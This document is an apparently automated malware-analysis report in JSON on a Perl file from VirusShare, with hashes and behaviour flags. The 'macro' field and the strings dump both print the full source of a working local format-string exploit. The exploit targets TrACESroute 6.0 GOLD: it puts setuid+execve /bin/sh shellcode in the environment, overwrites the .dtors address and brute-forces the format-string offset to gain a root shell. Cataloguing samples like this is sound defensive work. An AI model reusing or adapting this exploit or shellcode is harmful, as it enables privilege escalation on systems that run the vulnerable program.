{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "execve": "May run an executable file or a system command on a Mac",
            "system": "May run an executable file or a system command on a Mac",
            "write": "May write to a file",
            "xor": "May attempt to obfuscate specific str"
        },
        "macro": "#!/usr/bin/perl\n\n## ---/ tracesex.pl /---------------------------------------------------\n##\n## TrACESroute 6.0 GOLD local format string exploit\n##   * tested on Red Hat Linux release 7.2 (Enigma)\n##   * Jun 12 2002\n##\n## Author: stringz // thc@drug.org\n## Vulnerability discovered by: downbload // downbload@hotmail.com\n##\n## Developed on the Snosoft Cerebrum test bed. - http://www.snosoft.com\n##\n## Greets: g463, syphix, S (super), KF, vacuum, dageshi, sozni,\n##         obscure, jove, rachel, kevin, and all of my 2e2h friends.\n##\n## ---/ powered by pot /-----------------------------------------------\n\n# setuid + execve shellcode\n$kode =\n  \"\\x31\\xdb\".                 # xor ebx, ebx\n  \"\\xf7\\xe3\".                 # mul ebx\n  \"\\xb0\\x17\".                 # mov al, 0x17\n  \"\\xcd\\x80\".                 # int 0x80\n  \"\\x31\\xc0\".                 # xor  eax, eax\n  \"\\x99\".                     # cdq\n  \"\\x52\".                     # push edx\n  \"\\x68\\x2f\\x2f\\x73\\x68\".     # push dword 0x68732f2f\n  \"\\x68\\x2f\\x62\\x69\\x6e\".     # push dword 0x6e69622f\n  \"\\x89\\xe3\".                 # mov  ebx, esp\n  \"\\x52\".                     # push edx\n  \"\\x53\".                     # push ebx\n  \"\\x89\\xe1\".                 # mov  ecx, esp\n  \"\\xb0\\x0b\".                 # mov  al, 0x0b\n  \"\\xcd\\x80\";                 # int  0x80\n\n$vuln    = \"./tr\";  # CHANGE THIS!@#$%!\n$dtors   = 0x804e48c + 4;;\n\nprintf(\"\\n-- TrACESroute 6.0 GOLD local format string exploit\\n\");\nprintf(\"-- Author: stringz // thc\\@drug.org\\n\\n\");\nprintf(\"-- Vulnerability discovered by: downbload // downbload\\@hotmail.com\\n\");\n\n$ret_addr = 0xc0000000 - 4\n    - (length($vuln) + 1)\n    - (length($kode) + 1)\n    ;\n\nundef(%ENV); $ENV{'1337'} = $kode;\n\nprintf(\"overwriting %#.08x with %#.08x\\n\", $dtors, $ret_addr);\nprintf(\"bruteforcing distance (1 .. 300)\\n\");\nsleep(2);\n\nfor (1 .. 300) {\n    $fmt_str = sw_fmtstr_create($dtors, $ret_addr, $_);\n    die(\"\\x0a\") if (system(\"$vuln -T $fmt_str localhost\"))\n        =~ m/^(0|256|512|32512)$/; # may need a tweak ;)\n}\n\nsub\nsw_fmtstr_create ($$$)\n{\n    die(\"Incorrect number of arguments for sw_fmtstr_create\")\n        unless @_ == 3;\n\n    my ($dest_addr, $ret_addr, $dist) = @_;\n    my ($word, $qword) = (2, 8);\n\n    # $dest_addr = where to write $ret_addr\n    # $ret_addr  = where to return execution\n    # $dist      = the calculated distance\n\n    $tmp1  = (($ret_addr >> 16) & 0xffff);\n    $tmp2  = $ret_addr & 0xffff;\n\n    if ($tmp1 < $tmp2) {\n        $high = $tmp1 - $qword;\n        $low  = $tmp2 - $high - $qword;\n\n        $dest_addr1 = pack('L', $dest_addr + $word);\n        $dest_addr2 = pack('L', $dest_addr);\n    }\n    else {\n        $high = $tmp2 - $qword;\n        $low  = $tmp1 - $high - $qword;\n\n        $dest_addr1 = pack('L', $dest_addr);\n        $dest_addr2 = pack('L', $dest_addr + $word);\n    }\n\n    sprintf(\"%.4s%.4s%%%uu%%%u\\$hn%%%uu%%%u\\$hn\",\n            $dest_addr1, $dest_addr2, $high, $dist,\n            $low, $dist + 1);\n}"
    },
    "filename": "VirusShare_47c969c669a703b534e3f1b17b86773e",
    "filesize": 3035,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "47c969c669a703b534e3f1b17b86773e",
        "sha1": "1fb376d10a0abb4c375d20db421305c62b60f8d3",
        "sha256": "9aa5f89826c632b288d1220c3bdf919720ebc2628f0ac8bc097e8f17b8433cd2"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "## ---/ tracesex.pl /---------------------------------------------------",
            "## TrACESroute 6.0 GOLD local format string exploit",
            "##   * tested on Red Hat Linux release 7.2 (Enigma)",
            "##   * Jun 12 2002",
            "## Author: stringz // thc@drug.org",
            "## Vulnerability discovered by: downbload // downbload@hotmail.com",
            "## Developed on the Snosoft Cerebrum test bed. - http://www.snosoft.com",
            "## Greets: g463, syphix, S (super), KF, vacuum, dageshi, sozni,",
            "##         obscure, jove, rachel, kevin, and all of my 2e2h friends.",
            "## ---/ powered by pot /-----------------------------------------------",
            "# setuid + execve shellcode",
            "$kode =",
            "  \"\\x31\\xdb\".                 # xor ebx, ebx",
            "  \"\\xf7\\xe3\".                 # mul ebx",
            "  \"\\xb0\\x17\".                 # mov al, 0x17",
            "  \"\\xcd\\x80\".                 # int 0x80",
            "  \"\\x31\\xc0\".                 # xor  eax, eax",
            "  \"\\x99\".                     # cdq",
            "  \"\\x52\".                     # push edx",
            "  \"\\x68\\x2f\\x2f\\x73\\x68\".     # push dword 0x68732f2f",
            "  \"\\x68\\x2f\\x62\\x69\\x6e\".     # push dword 0x6e69622f",
            "  \"\\x89\\xe3\".                 # mov  ebx, esp",
            "  \"\\x52\".                     # push edx",
            "  \"\\x53\".                     # push ebx",
            "  \"\\x89\\xe1\".                 # mov  ecx, esp",
            "  \"\\xb0\\x0b\".                 # mov  al, 0x0b",
            "  \"\\xcd\\x80\";                 # int  0x80",
            "$vuln    = \"./tr\";  # CHANGE THIS!@#$%!",
            "$dtors   = 0x804e48c + 4;;",
            "printf(\"\\n-- TrACESroute 6.0 GOLD local format string exploit\\n\");",
            "printf(\"-- Author: stringz // thc\\@drug.org\\n\\n\");",
            "printf(\"-- Vulnerability discovered by: downbload // downbload\\@hotmail.com\\n\");",
            "$ret_addr = 0xc0000000 - 4",
            "    - (length($vuln) + 1)",
            "    - (length($kode) + 1)",
            "    ;",
            "undef(%ENV); $ENV{'1337'} = $kode;",
            "printf(\"overwriting %#.08x with %#.08x\\n\", $dtors, $ret_addr);",
            "printf(\"bruteforcing distance (1 .. 300)\\n\");",
            "sleep(2);",
            "for (1 .. 300) {",
            "    $fmt_str = sw_fmtstr_create($dtors, $ret_addr, $_);",
            "    die(\"\\x0a\") if (system(\"$vuln -T $fmt_str localhost\"))",
            "        =~ m/^(0|256|512|32512)$/; # may need a tweak ;)",
            "sw_fmtstr_create ($$$)",
            "    die(\"Incorrect number of arguments for sw_fmtstr_create\")",
            "        unless @_ == 3;",
            "    my ($dest_addr, $ret_addr, $dist) = @_;",
            "    my ($word, $qword) = (2, 8);",
            "    # $dest_addr = where to write $ret_addr",
            "    # $ret_addr  = where to return execution",
            "    # $dist      = the calculated distance",
            "    $tmp1  = (($ret_addr >> 16) & 0xffff);",
            "    $tmp2  = $ret_addr & 0xffff;",
            "    if ($tmp1 < $tmp2) {",
            "        $high = $tmp1 - $qword;",
            "        $low  = $tmp2 - $high - $qword;",
            "        $dest_addr1 = pack('L', $dest_addr + $word);",
            "        $dest_addr2 = pack('L', $dest_addr);",
            "    }",
            "    else {",
            "        $high = $tmp2 - $qword;",
            "        $low  = $tmp1 - $high - $qword;",
            "        $dest_addr1 = pack('L', $dest_addr);",
            "        $dest_addr2 = pack('L', $dest_addr + $word);",
            "    }",
            "    sprintf(\"%.4s%.4s%%%uu%%%u\\$hn%%%uu%%%u\\$hn\",",
            "            $dest_addr1, $dest_addr2, $high, $dist,",
            "            $low, $dist + 1);"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.snosoft.com"
        ]
    },
    "time": "0:00:00.292857",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
